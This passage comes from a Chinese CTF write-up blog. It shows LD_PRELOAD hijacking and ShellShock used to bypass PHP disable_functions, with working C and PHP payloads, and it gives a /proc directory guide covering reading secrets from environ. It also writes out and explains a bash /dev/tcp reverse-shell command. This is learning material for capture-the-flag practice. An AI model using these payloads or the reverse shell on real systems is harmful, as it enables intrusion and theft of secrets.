LD_PRELOAD是Linux中的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数。</p><p>那我们就可以利用ld_preload去劫持函数来达到我们执行恶意代码的目的，比如一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，也是用自己写的恶意的so文件去覆盖。</p></blockquote><p><strong>这里用一个随机数函数的劫持来演示一下</strong></p><p>生成随机数的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>srand(time(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机生成种子，保证每次出现的随机数不相同</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span>(i--) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,rand());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -o rand randnum.c<br><br>./rand<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312003634363.png" alt="image-20240312003634363"></p><p>接下来写一个用于劫持的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//unrand.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">rand</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">666</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后用下面的命令生成so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">gcc -shared -fPIC 自定义文件.c -o 生成的库文件.so</span><br>gcc -shared -fPIC unrand.c -o unrand.so<br>export LD_PRELOAD=$PWD/unrand.so<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-fpic 选项指示编译器生成与位置无关的代码,-shared 选项指示链接器创建一个共享的目标文件</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">unset</span> LD_PRELOAD 可以还原函数关系</span><br></code></pre></td></tr></table></figure><p>然后用ldd命令去看一下前后动态库加载的顺序</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312004616502.png" alt="image-20240312004616502"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312004626732.png" alt="image-20240312004626732"></p><p>可以看出来其中的rand的函数被我们成功劫持了。</p><p>如果不知道调用了什么函数我们还可以用下面两个命令去跟一下系统调用的情况,但是这两个跟踪的重点有所不同</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace a.out  #跟踪系统调用和信号<br>ltrace a.out  #用来跟踪进程调用库函数的情况<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319163751066.png" alt="image-20240319163751066"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319163811697.png" alt="image-20240319163811697"></p><p>所以想要劫持具体函数的时候可以用ltrace这个命令更清晰</p><p>还有一个<strong>readelf</strong>命令可以用来查看elf文件的信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -s &lt;ELF文件&gt; #可以显示包含在可执行文件或共享库中的所有符号，包括函数符号<br></code></pre></td></tr></table></figure><blockquote><p>更多的东西参考这两篇文章：<a href="https://blog.csdn.net/qq_63701832/article/details/129760495">LD_PRELOAD劫持（超详细篇）-CSDN博客</a>，<a href="https://cs.pynote.net/se/202203301/#_1">用LD_PRELOAD劫持的原理和实践 | CS笔记 (pynote.net)</a></p></blockquote><p><strong>现在看回这道题</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312220351561.png" alt="image-20240312220351561"></p><p>这个页面直接就是一个shell，那我们直接蚁剑去连接，用虚拟终端执行了一下命令，发现执行不了的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312220455165.png" alt="image-20240312220455165"></p><p>这里就是因为disable_function禁用了所有命令执行的函数，所以这里就要用到ld_preload劫持的方法了，我们去看目录是有一个&#x2F;flag的，但是没有东西应该也是因为函数禁用的原因，然后还有一个&#x2F;readflag程序，应该就是要调用那个程序来读flag</p><p>这里先在本地Linux上写一个hack.c程序：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">angel</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;/readflag &gt; /tmp/eval.txt&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后生成hack.so文件,上传到&#x2F;tmp目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gcc -shared -fPIC hack.c -o hack.so<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312221737068.png" alt="image-20240312221737068"></p><p>然后我们再写一个php文件用于修改环境变量并用于调用被劫持的函数来读flag</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;ld_preload=/tmp/hack.so&quot;</span>);<br><br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312221702596.png" alt="image-20240312221702596"></p><p>然后去include一下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312222556100.png" alt="image-20240312222556100"></p><p>就可以看到&#x2F;tmp目录一下有flag了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312222624367.png" alt="image-20240312222624367"></p><p>现在来解释一下上面的原理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__attribute__((constructor)) 是一种 GNU C 语言扩展，用于设置函数属性。<br><br>__attribute__ 是一个特性（attribute）机制，它允许你为函数、变量或类型添加额外的属性。这些属性可以影响编译器的行为，从而优化程序的性能、可移植性和可读性。<br><br>__attribute__((constructor)) 用于指定一个函数，该函数会在程序启动时自动执行，并且在 main() 函数之前。<br><br>类似地，还有 __attribute__((destructor))，它会在 main() 函数退出或调用 exit() 后自动执行。这对于释放资源或清理工作非常有用。<br><br>你还可以为属性设置优先级，例如：__attribute__((constructor(101))) void before1();这将按照优先级顺序调用带有 constructor 属性的函数。<br><br>注意，__attribute__ 是 GCC 编译器的扩展语法，不是标准 C 语言的一部分，因此在使用时需要考虑可移植性问题。<br></code></pre></td></tr></table></figure><blockquote><p>这里用mail()和error_log()的原因是因为他们都会去调用外部的&#x2F;usr&#x2F;sbin&#x2F;sendmail程序用来发送邮件信息，所以我们就可以因此而劫持，可以用下面的命令去查看一下跟踪一下该函数的调用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strace -f -e trace=execve php 1.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319170122690.png" alt="image-20240319170122690"></p><p>然后我们还可以用命令去查看该程序调用了什么函数</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">readelf -Ws /usr/sbin/sendmail<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240312225539592.png" alt="image-20240312225539592"></p><p>我们也可以去针对里面的一些函数去劫持，效果是一样的。</p></blockquote><h1 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>shellshock是一个在2014被公布的和bash有关的漏洞</p><p>参考文章：<a href="https://www.zhihu.com/tardis/zm/art/35579956?source_id=1003">什么是ShellShock攻击？ (zhihu.com)</a></p><p><strong>就先来了解一下bash</strong></p><blockquote><p>bash是一个shell环境，它允许用户输入命令来与操作系统进行交互，执行各种任务。</p></blockquote><p>我们每次输入bash的时候，系统就会创建一个新的子进程，而且涉及到fork和exec这两个系统调用的配合，其中的过程有下面几个步骤：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.fork调用：当Bash需要创建一个新的子进程时，它首先调用fork。这个调用会创建一个与当前进程（父进程）几乎完全相同的新进程（子进程）。子进程会复制父进程的内存空间，包括代码段、数据段和堆栈段。fork调用在父进程中返回新创建的子进程的进程ID，在子进程中返回0。<br><br><br>2.子进程的环境：尽管子进程复制了父进程的内存空间，但它是一个独立的进程，拥有自己的进程ID，并且其执行路径可以与父进程不同。<br><br><br>3.exec调用：在子进程中，通常会随后调用exec系列函数之一来执行一个新的程序。exec函数会替换当前进程的内存空间，包括代码段和数据段，用新程序的内容来替换。这意味着子进程将停止执行原先继承自父进程的程序，开始执行exec指定的新程序。从用户的角度看，子进程似乎变成了一个全新的程序。<br><br><br>4.父进程的行为：在fork之后，父进程可以选择等待子进程结束，或者继续执行其他任务。如果父进程选择等待，它可以使用wait或waitpid系统调用来获取子进程的终止状态。<br></code></pre></td></tr></table></figure><p>这个机制可以让bash在不终止当前会话的情况下，启动和管理多个任务，例如在运行一个外部脚本的时候，bash就会使用fork和exec来创建一个运行该命令的子进程，而bash自身则继续等待下一个用户的输入。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">echo &quot;父进程的PID：$$&quot;<br>bash -c &#x27;echo &quot;子进程的PID：$$&quot;&#x27;<br></code></pre></td></tr></table></figure><p>上面两个命令输出结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318234637280.png" alt="image-20240318234637280"></p><p>我们还可以通过下面几个命令查看进程情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ps -f #查看当前进程的状态，-f表示全格式，可以显示出父进程的ID(PPID)<br>pstree -p #以树状图的形式显示进程及其子进程，-p选项可以显示进程的PID<br>cat /proc/PID/status #输入想要看的进程PID，可以知道进程的各种详细情况<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240318235046836.png" alt="image-20240318235046836"></p><p>下面是会启动子进程的几种方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.后台作业：使用&amp;将命令放入后台执行，例如command &amp;。<br>2.管道：使用|将多个命令连接起来，每个命令都会在子进程中执行，例如command1 | command2。<br>3.括号命令列表：使用()将命令包围起来，这些命令会在子shell中执行，例如(cmd1; cmd2; cmd3)。<br>4.执行外部脚本或程序：直接运行一个脚本或程序，如bash ./test.sh。<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(echo $BASH_SUBSHELL)  #BASH_SUBSHELL这个变量能显示当前shell的嵌套深度<br><span class="hljs-meta prompt_">$</span><span class="language-bash">BASH_SUBSHELL</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240319000940380.png" alt="image-20240319000940380"></p><p><strong>环境变量和bash</strong></p><p>在bash中，子进程是不能继承父进程的普通变量或函数变量的，但是可以继承父进程的普通环境变量和函数环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# gu=&quot;hacker&quot;<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br>hacker<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084451562.png" alt="image-20240321084451562"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export gu<br><br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $gu<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084631286.png" alt="image-20240321084631286"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack() &#123; echo &quot;hacker&quot;; &#125;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084802497.png" alt="image-20240321084802497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f hack<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# hack<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321084851281.png" alt="image-20240321084851281"></p><p>下面就是有漏洞点的地方了，但是要在bash&lt;&#x3D;4.3版本才有该漏洞</p><p>先来展示一下没有漏洞的情况</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test=&#x27;() &#123; echo &quot;this is a bug&quot;; &#125;&#x27;<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export -f test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# export test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# bash<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# test<br>┌──(root㉿DESKTOP-6T61DMR)-[~/tmp]<br>└─# echo $test<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321085418028.png" alt="image-20240321085418028"></p><p>有漏洞的情况就是在子进程中直接输入test会被当作函数来执行，比如文章中的这样</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:42] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123;  echo &quot;ailx10 is a hacker&quot;;&#125;&#x27;<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -nf gu<br>[04/12/2018 09:48] seed@ubuntu:~/Seed/shellshock$ export -n gu<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export -f ailx10<br>bash: export: ailx10: not a function<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:49] seed@ubuntu:~/Seed/shellshock$ bash<br>[04/12/2018 09:50] seed@ubuntu:~/Seed/shellshock$ ailx10<br>ailx10 is a hacker<br></code></pre></td></tr></table></figure><p>还可以有这种方式，利用() { :; };&#x2F;bin&#x2F;ls</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">[04/12/2018 09:57] seed@ubuntu:~/Seed/shellshock$ ailx10=&#x27;() &#123; :; &#125;;/bin/ls&#x27;<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ export ailx10<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ bash<br>curl-7.20.0     myls      myls.c      myprog.cgi.1  readme.txt<br>curl-7.20.0.tar.gz  myls-notroot  myprog.cgi  myprog.cgi.2<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$ exit<br>exit<br>[04/12/2018 09:58] seed@ubuntu:~/Seed/shellshock$<br></code></pre></td></tr></table></figure><p><strong>综上所述触发bash漏洞可以归纳如下</strong></p><ol><li>产生新的bash</li><li>通过环境变量传递</li><li>环境变量以<code>() &#123;&#125;</code>这样的形式</li></ol><p><strong>可以用下面的一条语句来验证是否有shellshock漏洞</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;<br></code></pre></td></tr></table></figure><p>不存在的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321090254063.png" alt="image-20240321090254063"></p><p>存在的情况：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321090319060.png" alt="image-20240321090319060"></p><blockquote><p>:在这里就相当于true</p><p><code>env</code>可以创建临时环境变量</p><p><code>bash -c</code>可以运行一个shell命令</p><p>对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}’后停止，也就是说定义在函数体外shell命令也会执行。</p></blockquote><p>那现在看回这题</p><p>同样蚁剑连上之后执行不了命令</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321140952793.png" alt="image-20240321140952793"></p><p>这题说是利用到了shellshock漏洞，那就要满足上面三个条件，这里是利用了执行error_log函数时会执行sh -c -t -i，这里还需要sh 默认的 shell 是 bash，然后就会开启一个新的bash环境所以如果存在漏洞即可触发，我们可以自己写一个error_log然后去跟踪调用看一下 </p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321142333751.png" alt="image-20240321142333751"></p><p>那么就可以同样利用上一题的方法，用putenv来写一个php文件然后上传触发</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;hack=() &#123; :; &#125;;cat /flag &gt;&gt; /var/www/html/flag.txt&quot;</span>);<br><span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321142626262.png" alt="image-20240321142626262"></p><p>emmm很怪啊收不到flag</p><p>难绷后来找到问题，环境变量一定要有PHP_前缀我也不知道为什么很奇怪，正确payload如下，这里flag不能直接读要用&#x2F;readflag：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_hack=() &#123; :; &#125;; /read &gt;&gt; /var/www/html/flag2.txt&quot;</span>); <br>   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240321145724033.png" alt="image-20240321145724033"></p><h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>proc目录作用总结</title>
      <link href="/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/10/proc%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>参考文章：<a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p><h1 id="proc目录是什么"><a href="#proc目录是什么" class="headerlink" title="&#x2F;proc目录是什么"></a>&#x2F;proc目录是什么</h1><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>这里看一下&#x2F;proc目录下有什么</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310230848618.png" alt="image-20240310230848618"></p><p>目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310231053017.png" alt="image-20240310231053017"></p><p>进程号为1的文件里有这些文件，其中有些文件是每个进程都会有的，ctf中我们需要的就是利用这些通用的文件来获取一些进程中的相关信息。</p><h1 id="proc目录作用"><a href="#proc目录作用" class="headerlink" title="&#x2F;proc目录作用"></a>&#x2F;proc目录作用</h1><p><strong>&#x2F;proc&#x2F;self</strong>指向的就是当前进程号的目录，这个会经常用到，因为比如靶机启动的时候会有一个自己的进程，这个时候就可以通过&#x2F;proc&#x2F;self来获取当前的进程号，进而获取我们需要的信息。</p><h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/cmdline<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310231615078.png" alt="image-20240310231615078"></p><p>比如目标启动了一个web服务的时候，比如<strong>python .&#x2F;app.py</strong>，我们就可以通过cat &#x2F;proc&#x2F;self&#x2F;cmdline来获得这个启动命令了。</p><h2 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h2><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls /proc/117/cwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310231940043.png" alt="image-20240310231940043"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/7163/cwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310232042034.png" alt="image-20240310232042034"></p><h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/exe<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310232728115.png" alt="image-20240310232728115"></p><h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/environ<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310232953047.png" alt="image-20240310232953047"></p><p>有时候secret_key会放在环境变量我们就可以去读取</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ls -al /proc/117/fd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310233433456.png" alt="image-20240310233433456"></p><p>然后想查看某个文件可以去cat对应的描述符</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat /proc/117/fd/7<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240310233618051.png" alt="image-20240310233618051"></p><blockquote><p><strong>在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote><p>bash反弹shell命令的编写也和fd有关，现在拿反弹shell的命令来解析一下，参考文章：<a href="https://www.anquanke.com/post/id/85712">https://www.anquanke.com/post/id/85712</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><blockquote><p>bash -i就是打开一个交互式的bash</p><p> &#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在&#x2F;dev&#x2F;udp&#x2F;。</p></blockquote><p>重点就是这个**&gt;&amp;**是什么意思</p><p>先来了解一下Linux中常用的文件描述符：</p><ul><li>标准输入(stdin)：代码为0，映射关系：&#x2F;dev&#x2F;stdin -&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;0 </li><li>标准输出(stdout)：代码为1，映射关系：&#x2F;dev&#x2F;stdout-&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;1</li><li>标准错误输出(stderr)：代码为2，映射关系：&#x2F;dev&#x2F;stderr -&gt; &#x2F;proc&#x2F;self&#x2F;fd&#x2F;2</li></ul><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406232216675.png" alt="image-20240406232216675"></p><p><code>&gt;&amp;</code> 是一个重定向操作符，它用于将文件描述符（file descriptor）重定向到另一个文件描述符或文件，不过这个符号和<code>&amp;&gt;</code>都是一个意思，也就是说上面的反弹shell命令换成这种符号也没关系。</p><p>例如<code>2&gt;&amp;1</code>就是将错误输出重定向到标准输出，也就是这两个流合为一条流了，报错和没报错的信息都会显示出来</p><p>而<code>&gt;&amp;</code>后面接文件的时候，就代表将标准输出和标准错误输出重定向至文件</p><p>而在后面加上0&gt;&amp;1就是将标准输入重定向至标准输出，而这里标准输出已经重定向至远程了，所以这里的标准输入也重定向至远程，这就保证了所有的命令执行都在这个tcp连接里面进行。</p><p>重定向符的意义：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&gt; 和 &lt; 分别代表重定向方向<br>&gt;&gt; 和 &lt;&lt; 分别代表追加<br>2&gt; 和 2&gt;&gt; 就是标准错误输出的使用<br></code></pre></td></tr></table></figure><p>所以整个指令的大概原理就是创建一个交互式的shell利用&gt;&amp;重定向至tcp连接，然后0&gt;&amp;1将文件描述符 0（标准输入）重定向到文件描述符 1（标准输出）的意思，也就是将输入和输出合并为一个流。这样做是为了确保命令的输入和输出都通过网络套接字进行交互。</p><p>综合起来，该命令的目的是将 Bash 的标准输入、标准输出和标准错误输出都重定向到指定的网络套接字。</p><h2 id="maps"><a href="#maps" class="headerlink" 